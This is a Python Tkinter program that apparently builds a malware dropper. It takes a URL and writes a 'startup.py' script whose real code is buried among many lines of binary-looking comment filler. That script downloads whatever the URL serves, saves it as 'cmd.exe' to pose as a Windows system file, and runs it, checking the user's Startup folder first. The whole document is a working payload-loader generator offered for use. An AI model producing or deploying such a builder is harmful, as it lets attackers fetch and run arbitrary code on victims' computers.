import os
from tkinter import *
root = Tk()
def Submit():
    link = url.get()
    with open("startup.py", "w") as writer:
        writer.write(fr"""

#001101011100101010010110110101010111010110010101010101010101010100101010010100101000101010010111010011000110100110010101010010101010
#011001010111010101101110110100100000111001100101010101010101010101010101010101010101010101101101010010101010101011010101010101010001
#001010110100100101010100000000000000000000000000011111010101010100101010101010010101010010101010010101010100101010101010101001010100
#011001010111010101101110110100100000111001100101010101010101010101010101010101010101010101101101010010101010101011010101010101010001
#001010110100100101010100000000000000000000000000011111010101010100101010101010010101010010101010010101010100101010101010101001010100
#000111010100101001010101010010101010001000001000100101010101000101010100101010100101010100101010010101010010101001010101001010101000#001101011100101010010110110101010111010110010101010101010101010100101010010100101000101010010111010011000110100110010101010010101010
#011001010111010101101110110100100000111001100101010101010101010101010101010101010101010101101101010010101010101011010101010101010001
#001010110100100101010100000000000000000000000000011111010101010100101010101010010101010010101010010101010100101010101010101001010100
#011001010111010101101110110100100000111001100101010101010101010101010101010101010101010101101101010010101010101011010101010101010001
#001010110100100101010100000000000000000000000000011111010101010100101010101010010101010010101010010101010100101010101010101001010100
#000111010100101001010101010010101010001000001000100101010101000101010100101010100101010100101010010101010010101001010101001010101000#001101011100101010010110110101010111010110010101010101010101010100101010010100101000101010010111010011000110100110010101010010101010
#011001010111010101101110110100100000111001100101010101010101010101010101010101010101010101101101010010101010101011010101010101010001
#001010110100100101010100000000000000000000000000011111010101010100101010101010010101010010101010010101010100101010101010101001010100
#011001010111010101101110110100100000111001100101010101010101010101010101010101010101010101101101010010101010101011010101010101010001
#001010110100100101010100000000000000000000000000011111010101010100101010101010010101010010101010010101010100101010101010101001010100
#000111010100101001010101010010101010001000001000100101010101000101010100101010100101010100101010010101010010101001010101001010101000#001101011100101010010110110101010111010110010101010101010101010100101010010100101000101010010111010011000110100110010101010010101010
#011001010111010101101110110100100000111001100101010101010101010101010101010101010101010101101101010010101010101011010101010101010001
#001010110100100101010100000000000000000000000000011111010101010100101010101010010101010010101010010101010100101010101010101001010100
#011001010111010101101110110100100000111001100101010101010101010101010101010101010101010101101101010010101010101011010101010101010001
#001010110100100101010100000000000000000000000000011111010101010100101010101010010101010010101010010101010100101010101010101001010100
#000111010100101001010101010010101010001000001000100101010101000101010100101010100101010100101010010101010010101001010101001010101000
#001101011100101010010110110101010111010110010101010101010101010100101010010100101000101010010111010011000110100110010101010010101010011001010111010101101110110100100000111001100101010101010101010101010101010101010101010101101101010010101010101011010101010101010001
#011001010111010101101110110100100000111001100101010101010101010101010101010101010101010101101101010010101010101011010101010101010001011001010111010101101110110100100000111001100101010101010101010101010101010101010101010101101101010010101010101011010101010101010001
#001010110100100101010100000000000000000000000000011111010101010100101010101010010101010010101010010101010100101010101010101001010100
#011001010111010101101110110100100000111001100101010101010101010101010101010101010101010101101101010010101010101011010101010101010001
#001010110100100101010100000000000000000000000000011111010101010100101010101010010101010010101010010101010100101010101010101001010100
#000111010100101001010101010010101010001000001000100101010101000101010100101010100101010100101010010101010010101001010101001010101000
import requests, os #0011010111001010100101101101010101110101100101010101010101010101001010100101001010001010100101110100110001101001011001010111010101101110110100100000111001100101010101010101010101010101010101010101010101101101010010101010101011010101010101010001
_001 = os.path.exists(fr'C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\cmd.exe') #0101110111
_010 = '{link}' #00110101110010101001011011010101011101011001010101010101010101010010101001010010100010101001011101001100011010011001110100101001001010101001
if _001 == False: response = requests.get(_010), open('cmd.exe', 'wb').write(response.content) #0101100111100000101011101110001001001010100100101101001010
os.startfile('cmd.exe') #001101011100101010010110110101010111010110010101010101010101010100101010010100101000101010010111010011000110
#011001010111010101101110110100100000111001100101010101010101010101010101010101010101010101101101010010101010101011010101010101010001
#001010110100100101010100000000000000000000000000011111010101010100101010101010010101010010101010010101010100101010101010101001010100
#011001010111010101101110110100100000111001100101010101010101010101010101010101010101010101101101010010101010101011010101010101010001
#001010110100100101010100000000000000000000000000011111010101010100101010101010010101010010101010010101010100101010101010101001010100
#011001010111010101101110110100100000111001100101010101010101010101010101010101010101010101101101010010101010101011010101010101010001
#001010110100100101010100000000000000000000000000011111010101010100101010101010010101010010101010010101010100101010101010101001010100
#011001010111010101101110110100100000111001100101010101010101010101010101010101010101010101101101010010101010101011010101010101010001
#001010110100100101010100000000000000000000000000011111010101010100101010101010010101010010101010010101010100101010101010101001010100
""")
Label(root, text="write your application URL: ").place(x=15, y=15)
Label(root, text="Startup repo: https://github.com/Unknow-per/Startup").place(x=15, y=150)
url = Entry(root, width=50)
Button(root, text="Submit", command=Submit, width=15, height=5).place(x=550, y=100)
url.place(x=115, y=50)
root.geometry("700x200")
root.title("Startup")
root.resizable(False, False)
root.mainloop()